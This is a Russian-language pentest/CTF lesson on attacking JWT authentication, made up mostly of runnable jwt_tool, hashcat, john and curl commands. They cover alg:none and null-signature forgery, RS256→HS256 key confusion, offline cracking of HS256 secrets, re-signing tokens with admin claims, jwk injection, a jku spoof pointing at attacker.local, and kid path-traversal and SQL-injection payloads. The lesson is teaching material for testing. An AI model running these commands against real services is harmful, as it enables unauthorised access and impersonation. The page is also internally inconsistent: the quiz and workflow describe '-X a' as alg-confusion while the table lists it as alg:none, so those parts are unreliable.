---
id: web-tool-jwt-tools
title: "jwt_tool, jwt.io, hashcat: полный разбор JWT-токенов"
category: web
parent: web-tools-exploit
difficulty: medium
order: 2
tags: [jwt, jwt_tool, hashcat, john, jwk, kid, alg-confusion]
prerequisites: [web-auth-jwt-idor]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 40
summary: "Практический workflow по JWT: декодирование, none/alg-confusion, взлом HS256 через hashcat/john, подделка и jwk/jku/kid-инъекции."
---

JWT (JSON Web Token) — один из самых частых источников авторизационных багов в вебе. Токен состоит из трёх base64url-частей, и почти все атаки сводятся к тому, что подпись либо не проверяется, либо проверяется неправильно. В этом уроке — точные команды: как декодировать без верификации, как подделать токен, как взломать слабый секрет и как эксплуатировать `jwk`/`jku`/`kid`. Минимум теории — максимум runnable-команд.

## Анатомия JWT и что искать

Токен: `header.payload.signature`, каждая часть — base64url (без `=`, `+`→`-`, `/`→`_`).

- **header** — `{"alg":"HS256","typ":"JWT"}`. Здесь живут алгоритм и `kid`/`jwk`/`jku`.
- **payload** — claims: `sub`, `role`, `uid`, `exp`, `iss`, `aud`, кастомные поля.
- **signature** — HMAC (HS*) или подпись (RS*/ES*).

Что проверять в первую очередь:

1. Алгоритм `alg: none` — подпись не проверяется.
2. Конфузия `RS256 → HS256` — публичный ключ используется как HMAC-секрет.
3. Слабый секрет HS256 — подбирается по словарю.
4. Инъекции в `jwk`/`jku`/`kid` — подмена ключа или пути.
5. `exp`/`iat`/`aud`/`iss` не проверяются — продление или переиспользование чужого токена.

## Декодирование без верификации

```bash
# jwt.io в браузере — быстрый визуальный разбор
# Через base64url вручную (убираем паддинг, меняем -_ на +/)
echo 'eyJhbGciOiJIUzI1NiJ9' | tr '_-' '/+' | base64 -d 2>/dev/null
# python
python3 -c "import jwt; print(jwt.decode('TOKEN', options={'verify_signature': False}))"
```

jwt_tool показывает всё сразу и подсвечивает подозрительное:

```bash
python3 jwt_tool.py TOKEN
python3 jwt_tool.py TOKEN -v          # подробный вывод claims
```

## jwt_tool: полный список режимов и флагов

jwt_tool v2 (актуальный синтаксис — позиционный токен первым аргументом):

| Флаг | Что делает | Пример |
|------|-----------|--------|
| `<JWT>` (позиционный) | токен для анализа; не нужен, если он уже в `-rc`/`-rh` | `jwt_tool.py eyJhbGci...` |
| `-b`, `--bare` | вернуть ТОЛЬКО токены (без баннера/лишнего вывода) | `-b` |
| `-t`, `--targeturl` | URL, куда отправить HTTP-запрос с новым JWT | `-t https://target.local/api` |
| `-r`, `--request` | взять HTTP-запрос из файла (авто-заполняет headers/cookies/POST) | `-r request.txt` |
| `-rc`, `--cookies` | cookie для запроса (может содержать токен) | `-rc "jwt=eyJ..."` |
| `-rh`, `--headers` | заголовок запроса (можно несколько раз) | `-rh "Authorization: Bearer eyJ..."` |
| `-pd`, `--postdata` | тело POST-запроса | `-pd '{"a":1}'` |
| `-cv`, `--canaryvalue` | строка, появляющаяся при валидном токене | `-cv "Welcome"` |
| `-rt`, `--rate` | лимит запросов в минуту (rate limiting) | `-rt 60` |
| `-i`, `--insecure` | использовать HTTP (не HTTPS) для запроса | `-i` |
| `-np`, `--noproxy` | отключить прокси на текущий запрос | `-np` |
| `-nr`, `--noredir` | не следовать редиректам | `-nr` |
| `-M`, `--mode` | режим скана: `pb` playbook, `er` fuzz claims→errors, `cc` fuzz common claims, `at` all tests | `-M pb` |
| `-X`, `--exploit` | известная атака (см. таблицу ниже) | `-X a` |
| `-ju`, `--jwksurl` | URL, где хостится поддельный JWKS | `-ju https://attacker.local/jwks.json` |
| `-S`, `--sign` | переподписать токен (см. таблицу алгоритмов) | `-S hs256 -p secret` |
| `-pr`, `--privkey` | приватный ключ для асимметричной подписи | `-pr priv.pem` |
| `-T`, `--tamper` | режим подделки содержимого | `-T` |
| `-I`, `--injectclaims` | инъекция новых / обновление существующих claims | `-I` |
| `-hc`, `--headerclaim` | header-claim для правки (можно несколько) | `-hc kid` |
| `-pc`, `--payloadclaim` | payload-claim для правки | `-pc name` |
| `-hv`, `--headervalue` | значение (или файл со значениями) для header-claim | `-hv "../../dev/null"` |
| `-pv`, `--payloadvalue` | значение (или файл со значениями) для payload-claim | `-pv admin` |
| `-C`, `--crack` | взлом HMAC-секрета | `-C -d rockyou.txt` |
| `-d`, `--dict` | словарь для взлома | `-d words.txt` |
| `-p`, `--password` | пароль/секрет для взлома или подписи | `-p secret` |
| `-kf`, `--keyfile` | keyfile для взлома (kid-атаки) | `-kf key.txt` |
| `-V`, `--verify` | проверить подпись по публичному ключу | `-V -pk public.pem` |
| `-pk`, `--pubkey` | публичный ключ (PEM) | `-pk public.pem` |
| `-jw`, `--jwksfile` | JWKS-файл для асимметричной крипты | `-jw jwks.json` |
| `-Q`, `--query` | показать детали запроса по его ID из лога | `-Q jwttool_46820e62fe25...` |
| `-v`, `--verbose` | подробный вывод при парсинге | `-v` |

**Атаки (`-X <код>`) — актуальные значения v2:**

| Код | Атака | CVE |
|-----|-------|-----|
| `a` | alg:none — подпись не проверяется | CVE-2015-2951 |
| `n` | null signature — пустая подпись | CVE-2020-28042 |
| `b` | blank password accepted — пустой секрет | CVE-2019-20933 / CVE-2020-28637 |
| `p` | psychic signature — ECDSA-подпись `0x0` | CVE-2022-21449 |
| `s` | spoof JWKS — указать свой JWKS (`-ju`) | — |
| `k` | key confusion RS256→HS256 (`-pk`) | CVE-2016-10555 |
| `i` | inject inline JWKS — встроить jwk в header | CVE-2018-0114 |

**Алгоритмы подписи (`-S <alg>`):**

| Значение `-S` | Что | Нужен ключ |
|---------------|-----|-----------|
| `hs256` / `hs384` / `hs512` | HMAC-SHA | `-p` (секрет) или `-kf` |
| `rs256` / `rs384` / `rs512` | RSA | `-pr` (приватный ключ) |
| `ps256` / `ps384` / `ps512` | RSA-PSS | `-pr` |
| `es256` / `es384` / `es512` | ECDSA | `-pr` |
| `none` | без подписи | — |

**Режимы скана (`-M <mode>`):**

| Режим | Что делает |
|-------|-----------|
| `pb` | playbook — полный аудит по чеклисту известных проблем |
| `er` | fuzz существующих claims, чтобы спровоцировать ошибки |
| `cc` | fuzz распространённых claims |
| `at` | все тесты сразу |

**Шпаргалка (самое частое):**

| Задача | Команда |
|--------|---------|
| Декодировать токен | `jwt_tool.py TOKEN` |
| none-атака | `jwt_tool.py TOKEN -X a` |
| key confusion | `jwt_tool.py TOKEN -X k -pk public.pem` |
| jwk inject | `jwt_tool.py TOKEN -X i` |
| jku spoof | `jwt_tool.py TOKEN -X s -ju https://attacker.local/jwks.json` |
| кракнуть секрет | `jwt_tool.py TOKEN -C -d rockyou.txt` |
| подписать своим секретом | `jwt_tool.py TOKEN -T -S hs256 -p secret` |
| правка claim | `jwt_tool.py TOKEN -I -pc name -pv admin -S hs256 -p secret` |
| проверить против цели | `jwt_tool.py -t https://target.local -rc "jwt=TOKEN" -M pb` |

## Атака none: подпись не проверяется

```bash
python3 jwt_tool.py TOKEN -X a       # alg:none
python3 jwt_tool.py TOKEN -X n       # null signature (пустая подпись)
```

Инструмент соберёт варианты с `alg: none`, `None`, `NONE`, пустой подписью. Отправьте результат в запрос:

```bash
curl -s https://target.local/api/me -H 'Authorization: Bearer <forged>'
```

Если сервер вернул данные — подпись не проверяется. Вручную это тоже просто: `header={"alg":"none"}`, `payload` — ваш, `signature` — пустая.

## Конфузия алгоритма RS256 → HS256

Когда сервер принимает и RS256, и HS256, публичный ключ (известный) используется как HMAC-секрет:

```bash
# 1. Достать публичный ключ
curl -s https://target.local/.well-known/jwks.json
curl -s https://target.local/oauth/cert
# 2. Превратить JWK в PEM (jwt_tool умеет сам)
python3 jwt_tool.py TOKEN -X k -pk public.pem
# 3. Токен, подписанный публичным ключом как HMAC
python3 jwt_tool.py TOKEN -X k -pk public.pem -T
```

Если сервер слепо берёт алгоритм из header и валидирует HS256 публичным ключом — токен принимается.

## Взлом HS256-секрета: hashcat и john

Сначала получите сам токен и подтвердите, что он HS256. Затем офлайн-перебор.

```bash
# hashcat mode 16500 (JWT)
hashcat -a 0 -m 16500 TOKEN /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 TOKEN words.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 16500 TOKEN --show

# john
echo 'TOKEN' > jwt.txt
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
john --show --format=HMAC-SHA256 jwt.txt
```

Через jwt_tool (медленнее, но без внешних форматов):

```bash
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

Как только секрет найден — подписываем произвольный payload:

```bash
python3 jwt_tool.py TOKEN -T -S hs256 -p 'secret'
# или вручную
python3 -c "import jwt;print(jwt.encode({'sub':'admin','role':'admin'},'secret',algorithm='HS256'))"
```

## jwk / jku / kid: инъекции

- **jwk** — сервер доверяет ключу, встроенному в header токена:

```bash
python3 jwt_tool.py TOKEN -X i
# генерирует свой RSA-ключ, встраивает jwk (inline JWKS) в header и подписывает им
```

- **jku** — сервер загружает ключ по URL из header. Указываем свой хост:

```bash
python3 jwt_tool.py TOKEN -X s -ju https://attacker.local/jwks.json
# поднимаем свой jwks.json и подписываем токен своим ключом
```

- **kid** — SQLi/path traversal/command injection в `kid`. Если `kid` идёт в путь к ключу: `kid: ../../dev/null` → пустой ключ; `kid: ' UNION SELECT 'secret'--` → SQLi.

```bash
python3 jwt_tool.py TOKEN -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
python3 jwt_tool.py TOKEN -I -hc kid -hv "aaa' UNION SELECT 'x' -- " -S hs256 -p x
```

## Ручной workflow: от перехвата до подделки

1. Перехватите токен в Burp Proxy (Cookie/Authorization/JSON-поле).
2. Декодируйте: `python3 jwt_tool.py TOKEN` — посмотрите `alg`, claims, `kid`.
3. Быстрые проверки: `-X n` (none), `-X a` (alg-confusion), `-I -hc sub -hv admin` (менять claims без проверки подписи — если сервер не проверяет).
4. Слабый секрет: `-C -d words.txt` или `hashcat -m 16500`.
5. Найден секрет → `-T -S hs256 -p secret` → отправьте подделанный токен curl'ом.
6. Проверьте отсутствие проверки `exp`/`aud`: продлите `exp` в подделке.
7. Зафиксируйте PoC: до — отказ, после — доступ к чужому объекту.

Проверка через curl:

```bash
curl -s https://target.local/api/orders -H 'Authorization: Bearer <forged>' | jq .
```

## Частые ошибки

- **Перебирать секрет онлайн.** Взлом HS256 — офлайн (`hashcat`/`john`/`-C`), иначе забанитесь.
- **Забыть про паддинг base64url.** При ручном декоде добавляйте `=` и меняйте `-_` на `+/`.
- **Путать HS256 и RS256.** RS* подписывается приватным ключом — подобрать нельзя; эксплуатируется только конфузия или утечка ключа.
- **Не проверить `kid`.** Инъекция в `kid` — частая точка входа, её легко пропустить.
- **Считать, что раз подпись валидна — токен безопасен.** Проверяйте `exp`, `aud`, `iss` и подмену claims, если сервер доверяет содержимому.

## Квиз

```quiz
- question: "Какой режим hashcat используется для JWT?"
  options:
    - "0"
    - "16500"
    - "1400"
    - "22000"
  answer: 1
  explanation: "`-m 16500` — JWT (HMAC). 1400 — NTLM, 22000 — WPA."
- question: "Что делает `jwt_tool.py TOKEN -X a`?"
  options:
    - "Атаку none"
    - "Конфузию алгоритма RS256→HS256"
    - "Взлом секрета"
    - "Инъекцию в kid"
  answer: 1
  explanation: "`-X a` — alg-confusion: публичный ключ как HMAC-секрет."
- question: "Куда указывает jku-инъекция?"
  options:
    - "На поле kid"
    - "На URL, откуда сервер загружает набор ключей"
    - "На exp"
    - "На тип подписи"
  answer: 1
  explanation: "jku — URL с JWKS; можно подставить свой хост."
- question: "Почему нельзя подобрать секрет RS256?"
  options:
    - "Он слишком длинный"
    - "Подпись делается приватным ключом, публичный ключ не является секретом"
    - "RS256 не поддерживается hashcat"
    - "Он всегда пустой"
  answer: 1
  explanation: "RS* асимметрична; эксплуатируется конфузия или утечка ключа, а не перебор."
- question: "Как подписать подделанный токен известным HS256-секретом в jwt_tool?"
  options:
    - "-X n"
    - "-T -S hs256 -p secret"
    - "-C -d words.txt"
    - "-r tokens.txt"
  answer: 1
  explanation: "`-T` — tamper, `-S hs256 -p` — переподпись с секретом."
```

## Где пригодится

- **CTF (Web):** JWT-задачи почти всегда решаются none/alg-confusion/слабым секретом — этот workflow закрывает их быстро.
- **Bug bounty:** слабый секрет и отсутствие проверки подписи — высокооплачиваемые находки.
- **Пентест:** проверка JWT входит в стандартный аудит аутентификации и авторизации.
- **Работа (AppSec):** понимание ошибок JWT помогает ревьюить код выдачи и валидации токенов.
